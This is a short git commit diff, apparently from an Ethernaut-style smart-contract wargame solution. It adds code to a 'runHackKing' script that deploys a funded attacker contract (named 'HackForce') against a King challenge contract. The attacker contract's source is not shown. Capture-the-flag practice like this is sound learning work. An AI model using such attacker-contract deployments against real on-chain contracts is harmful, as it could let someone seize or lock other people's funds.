690313e0e88f33638e7a94e094ee1a08c276faa7
John M <neshamon@protonmail.com>
2022-01-25 11:56:26 -0600

    Set up HackKing contract factory

--- scripts/runHackKing.js
+++ scripts/runHackKing.js
@@ -8,6 +8,9 @@ const main = async () => {
   const kingContract = await new hre.ethers.Contract("0x728a90D5dF447c3298786985b24Af810cb4Cde71", kingAbi.abi, wallet);
   console.log("Delegate contract: " + kingContract.address);
 
+  const hackKingFactory = await hre.ethers.getContractFactory("HackForce");
+  const hackKingContract = await hackKingFactory.deploy('0x2A6Aec7F39856Efc74544a53601d228Eb5c43698', {value: 1000});
+  await hackKingContract.deployed();
 
   await wallet.sendTransaction({
     to: kingContract.address,
